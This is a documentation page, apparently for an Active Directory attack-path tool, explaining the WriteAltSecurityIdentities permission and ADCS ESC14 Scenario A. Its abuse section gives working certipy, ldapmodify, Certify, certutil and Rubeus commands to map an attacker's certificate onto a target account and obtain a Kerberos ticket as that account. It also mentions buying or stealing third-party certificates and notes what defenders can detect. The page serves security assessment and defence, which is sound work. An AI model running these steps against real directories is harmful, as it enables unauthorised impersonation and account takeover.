@@ -1,0 +1,163 @@
+---
+title: WriteAltSecurityIdentities
+description: "The principal can write to the altSecurityIdentities attribute on a user or computer, enabling explicit certificate mappings and ADCS ESC14 Scenario A."
+hidden: true
+---
+
+import ResourceEditionPill from '/snippets/resources/edition-pill.mdx';
+
+<ResourceEditionPill />
+
+The `altSecurityIdentities` attribute stores explicit certificate mappings for a principal. An explicit certificate mapping links a specific certificate to the target as an alternative to the normal certificate-to-account mapping rules, allowing authentication as that principal.
+
+## Abuse Info
+
+Write access to `altSecurityIdentities` may enable an ADCS ESC14 Scenario A attack.
+
+An attacker can add an explicit certificate mapping on the target that refers to a certificate in the attacker's possession, then use that certificate to authenticate as the target.
+
+The certificate must meet the following requirements:
+
+1. Chain up to a trusted root CA on the domain controller.
+2. Include an Enhanced Key Usage (EKU) extension that enables domain authentication.
+3. Not include an Other Name / Principal Name entry (UPN) in the Subject Alternative Name (SAN).
+
+The EKUs that enable domain authentication over Kerberos are:
+
+* Client Authentication (`1.3.6.1.5.5.7.3.2`)
+* PKINIT Client Authentication (`1.3.6.1.5.2.3.4`)
+* Smart Card Logon (`1.3.6.1.4.1.311.20.2.2`)
+* Any Purpose (`2.5.29.37.0`)
+* SubCA (no EKUs)
+
+The last certificate requirement means user certificates typically do not work, so the certificate usually must be for a computer. By default, the ADCS certificate template `Computer (Machine)` meets these requirements and grants Domain Computers enrollment rights. The target can still be a user.
+
+The last requirement does not apply if a domain controller has UPN mapping disabled. See [How to disable the Subject Alternative Name for UPN mapping](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ff520074(v=ws.10)).
+
+If the attacker cannot obtain a suitable certificate from the target environment, they may also be able to use a third-party Client Authentication certificate.
+
+This works because explicit certificate mapping differs from implicit certificate mapping. Implicit mapping requires the certificate to chain to a CA certificate in the domain controller's NTAuth store. Explicit mapping does not. For explicit mapping, the certificate only needs to chain to a trusted root CA on the domain controller.
+
+Windows trusts many third-party root CAs by default, so an attacker may be able to buy or steal a third-party certificate with the Client Authentication EKU and use it for ESC14 Scenario A. For example, providers such as [SSL.com](https://www.ssl.com/products/device-machine-trust/client-authentication/) are trusted by Windows and offer client authentication certificates.
+
+The abuse is possible with the strong explicit certificate mappings `X509IssuerSerialNumber` or `X509SHA1PublicKey`. The examples below use `X509SHA1PublicKey`.
+
+### Linux
+
+Obtain a certificate that meets the requirements above, for example by dumping a certificate from a computer or enrolling a new certificate as a computer:
+
+```bash
+certipy req -u computername -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC14
+```
+
+If enrollment fails because an email or DNS name is unavailable and cannot be added to the Subject or SAN, the enrollee principal does not have its `mail` or `dNSHostName` attribute set as required by the certificate template. The `mail` attribute can be set on users and computers, but `dNSHostName` can only be set on computers. Computers have validated write permission to their own `dNSHostName` attribute by default, but neither users nor computers can write to their own `mail` attribute by default.
+
+Get the SHA1 hash of the certificate public key:
+
+```bash
+openssl pkcs12 -info -in computername.pfx -nokeys | openssl x509 -noout -sha1 -fingerprint | tr -d ':' | tr '[:upper:]' '[:lower:]'
+...
+sha1 fingerprint=f61331a504cff8cb5e60c269632c31aa3032a54a
+```
+
+Add the explicit certificate mapping string to the target principal:
+
+```bash
+echo -e "dn: CN=Target,CN=Users,DC=forestroot,DC=com\nchangetype: modify\nadd: altSecurityIdentities\naltSecurityIdentities: X509:<SHA1-PUKEY>f61331a504cff8cb5e60c269632c31aa3032a54a" | ldapmodify -x -D "CN=Attacker,CN=Users,DC=forestroot,DC=com" -w 'PWD' -h forestroot.com
+```
+
+Verify that the mapping was added:
+
+```bash
+ldapsearch -x -D "CN=Attacker,CN=Users,DC=forestroot,DC=com" -w 'PWD' -h "forestroot.com" -b "CN=Target,CN=Users,DC=forestroot,DC=com" altSecurityIdentities
+```
+
+Request a ticket granting ticket (TGT) from the domain using the certificate:
+
+```bash
+certipy auth -pfx computername.pfx -dc-ip 172.16.126.128
+```
+
+After the abuse, remove the explicit certificate mapping string from the target principal:
+
+```bash
+echo -e "dn: CN=Target,CN=Users,DC=forestroot,DC=com\nchangetype: modify\ndelete: altSecurityIdentities\naltSecurityIdentities: X509:<SHA1-PUKEY>f61331a504cff8cb5e60c269632c31aa3032a54a" | ldapmodify -x -D "CN=Attacker,CN=Users,DC=forestroot,DC=com" -w 'PWD' -h forestroot.com
+```
+
+### Windows
+
+Obtain a certificate that meets the requirements above, for example by dumping a certificate from a computer or enrolling a new certificate as a computer with Certify (2.0):
+
+```powershell
+Certify.exe request --ca ca01.forestroot.com\Forestroot-CA01-CA --template Machine --machine --output-pem
+```
+
+Save the certificate as `cert.pem` and the private key as `cert.key`, then convert it to a PFX file:
+
+```powershell
+certutil.exe -MergePFX .\cert.pem .\cert.pfx
+```
+
+Get the SHA1 hash of the certificate public key:
+
+```powershell
+certutil.exe -dump -v .\cert.pfx
+...
+Cert Hash(sha1): ef9375785421d3ad286d8bdeb166f0f697266992
+...
+```
+
+Add the explicit certificate mapping string to the target principal:
+
+```powershell
+Add-AltSecIDMapping -DistinguishedName "CN=Target,CN=Users,DC=forestroot,DC=com" -MappingString "X509:<SHA1-PUKEY>ef9375785421d3ad286d8bdeb166f0f697266992"
+```
+
+Verify that the mapping was added:
+
+```powershell
+Get-AltSecIDMapping -SearchBase "CN=Target,CN=Users,DC=forestroot,DC=com"
+```
+
+Request a TGT from the domain using the target identity and the PFX-formatted certificate:
+
+```powershell
+Rubeus.exe asktgt /user:"forestroot\target" /certificate:cert.pfx /ptt
+```
+
+After the abuse, remove the explicit certificate mapping string from the target principal:
+
+```powershell
+Remove-AltSecIDMapping -DistinguishedName "CN=Target,CN=Users,DC=forestroot,DC=com" -MappingString "X509:<SHA1-PUKEY>ef9375785421d3ad286d8bdeb166f0f697266992"
+```
+
+## Opsec Considerations
+
+When the affected certificate authority issues the certificate to the attacker, it retains a local copy of that certificate in its issued certificates store. Defenders may analyze issued certificates to identify illegitimately issued certificates and the principal that requested them.
+
+## Edge Schema
+
+Source: [User](/resources/nodes/user), [Group](/resources/nodes/group), [Computer](/resources/nodes/computer)<br />
+Destination: [User](/resources/nodes/user), [Computer](/resources/nodes/computer)<br />
+Traversable: **Yes**
+
+## References
+
+This edge is related to the following MITRE ATT&CK technique:
+
+* [T1098: Account Manipulation](https://attack.mitre.org/techniques/T1098/)
+
+### Abuse and Opsec references
+
+* [ADCS ESC14 Abuse Technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
+* [Certified Pre-Owned - Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [How to disable the Subject Alternative Name for UPN mapping](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ff520074(v=ws.10))
+* [Certipy](https://github.com/ly4k/Certipy)
+* [Certify](https://github.com/GhostPack/Certify)
+* [Rubeus](https://github.com/GhostPack/Rubeus)
+* [Add-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1)
+* [Get-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1)
+* [Remove-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Remove-AltSecIDMapping.ps1)
+* [ldapsearch](https://linux.die.net/man/1/ldapsearch)
+* [ldapmodify](https://linux.die.net/man/1/ldapmodify)
+* [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
